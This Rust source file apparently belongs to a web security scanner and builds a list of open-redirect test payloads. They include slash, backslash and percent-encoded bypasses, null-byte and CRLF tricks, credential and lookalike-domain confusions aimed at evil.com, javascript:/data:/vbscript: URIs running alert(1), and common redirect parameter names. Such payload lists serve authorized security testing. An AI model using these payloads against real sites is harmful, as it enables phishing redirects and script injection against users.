use super::{Payload, PayloadType, Severity};

pub fn get_payloads() -> Vec<Payload> {
    let mut payloads = Vec::new();

    let param_based = vec![
        ("//evil.com", "Double slash redirect", Severity::High),
        ("///evil.com", "Triple slash redirect", Severity::High),
        ("////evil.com", "Quad slash redirect", Severity::High),
        ("/\\/evil.com", "Backslash redirect", Severity::High),
        ("\\/evil.com", "Leading backslash", Severity::High),
        ("//evil.com/", "Trailing slash", Severity::High),
        ("//evil.com/path", "With path", Severity::High),
        ("http://evil.com", "Full HTTP URL", Severity::High),
        ("https://evil.com", "Full HTTPS URL", Severity::High),
        ("//evil%E3%80%82com", "Unicode dot", Severity::High),
    ];

    let bypass_basic = vec![
        ("//evil%2ecom", "Encoded dot", Severity::High),
        ("//evil%2Ecom", "Uppercase encoded dot", Severity::High),
        ("//evil.com%2fpath", "Encoded slash in path", Severity::High),
        ("//evil.com%00.target.com", "Null byte", Severity::High),
        (
            "//evil.com%0d%0a.target.com",
            "CRLF injection",
            Severity::High,
        ),
        (
            "http://evil.com%23.target.com",
            "Fragment bypass",
            Severity::High,
        ),
        (
            "http://evil.com%3f.target.com",
            "Query bypass",
            Severity::High,
        ),
        (
            "http://evil.com%.target.com",
            "Truncated encoding",
            Severity::Medium,
        ),
        ("//evil.com\\@target.com", "Backslash at", Severity::High),
        (
            "http://target.com@evil.com",
            "Credentials bypass",
            Severity::Critical,
        ),
    ];

    let protocol_variants = vec![
        ("javascript:alert(1)", "JavaScript protocol", Severity::High),
        (
            "javascript://evil.com",
            "JavaScript with host",
            Severity::High,
        ),
        (
            "data:text/html,<script>alert(1)</script>",
            "Data URI",
            Severity::High,
        ),
        (
            "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
            "Base64 data URI",
            Severity::High,
        ),
        ("vbscript:alert(1)", "VBScript protocol", Severity::Medium),
    ];

    let encoded_variants = vec![
        ("%2f%2fevil.com", "Full URL encoded", Severity::High),
        ("%252f%252fevil.com", "Double encoded", Severity::High),
        ("%2f%5cevil.com", "Mixed encoding", Severity::High),
        ("%c0%2f%c0%2fevil.com", "Overlong UTF-8", Severity::Medium),
        ("//evil.com%00", "Null terminated", Severity::High),
        ("//evil.com%09", "Tab terminated", Severity::High),
        ("//evil.com%0a", "Newline terminated", Severity::High),
        (
            "//evil.com%0d",
            "Carriage return terminated",
            Severity::High,
        ),
    ];

    let common_params = vec![
        ("url=//evil.com", "url parameter", Severity::High),
        ("next=//evil.com", "next parameter", Severity::High),
        ("redirect=//evil.com", "redirect parameter", Severity::High),
        ("return=//evil.com", "return parameter", Severity::High),
        (
            "returnUrl=//evil.com",
            "returnUrl parameter",
            Severity::High,
        ),
        (
            "return_url=//evil.com",
            "return_url parameter",
            Severity::High,
        ),
        ("redir=//evil.com", "redir parameter", Severity::High),
        (
            "redirect_uri=//evil.com",
            "redirect_uri parameter",
            Severity::High,
        ),
        ("callback=//evil.com", "callback parameter", Severity::High),
        ("continue=//evil.com", "continue parameter", Severity::High),
        ("dest=//evil.com", "dest parameter", Severity::High),
        (
            "destination=//evil.com",
            "destination parameter",
            Severity::High,
        ),
        ("go=//evil.com", "go parameter", Severity::High),
        ("goto=//evil.com", "goto parameter", Severity::High),
        ("target=//evil.com", "target parameter", Severity::High),
        ("link=//evil.com", "link parameter", Severity::High),
        ("forward=//evil.com", "forward parameter", Severity::High),
        ("out=//evil.com", "out parameter", Severity::High),
    ];

    let context_bypass = vec![
        (
            "http://target.com.evil.com",
            "Subdomain takeover style",
            Severity::High,
        ),
        ("http://eviltarget.com", "Similar domain", Severity::Medium),
        (
            "http://target.com@evil.com:8080",
            "Port variation",
            Severity::High,
        ),
        (
            "http://target.com%00@evil.com",
            "Null in credentials",
            Severity::High,
        ),
        (
            "http://evil.com#target.com",
            "Fragment after",
            Severity::High,
        ),
        ("http://evil.com?target.com", "Query after", Severity::High),
        (
            "http://evil.com/.target.com",
            "Path segment",
            Severity::High,
        ),
        (
            "http://evil.com\\target.com",
            "Backslash in path",
            Severity::High,
        ),
        ("@evil.com", "At sign only", Severity::High),
        ("//evil\\.com", "Escaped dot", Severity::Medium),
    ];

    for (payload, desc, severity) in param_based {
        payloads.push(Payload {
            payload_type: PayloadType::Redirect,
            payload: payload.to_string(),
            description: desc.to_string(),
            severity,
            tags: vec!["param-based".to_string()],
        });
    }

    for (payload, desc, severity) in bypass_basic {
        payloads.push(Payload {
            payload_type: PayloadType::Redirect,
            payload: payload.to_string(),
            description: desc.to_string(),
            severity,
            tags: vec!["bypass".to_string()],
        });
    }

    for (payload, desc, severity) in protocol_variants {
        payloads.push(Payload {
            payload_type: PayloadType::Redirect,
            payload: payload.to_string(),
            description: desc.to_string(),
            severity,
            tags: vec!["protocol".to_string()],
        });
    }

    for (payload, desc, severity) in encoded_variants {
        payloads.push(Payload {
            payload_type: PayloadType::Redirect,
            payload: payload.to_string(),
            description: desc.to_string(),
            severity,
            tags: vec!["encoded".to_string()],
        });
    }

    for (payload, desc, severity) in common_params {
        payloads.push(Payload {
            payload_type: PayloadType::Redirect,
            payload: payload.to_string(),
            description: desc.to_string(),
            severity,
            tags: vec!["common-param".to_string()],
        });
    }

    for (payload, desc, severity) in context_bypass {
        payloads.push(Payload {
            payload_type: PayloadType::Redirect,
            payload: payload.to_string(),
            description: desc.to_string(),
            severity,
            tags: vec!["context-bypass".to_string()],
        });
    }

    payloads
}
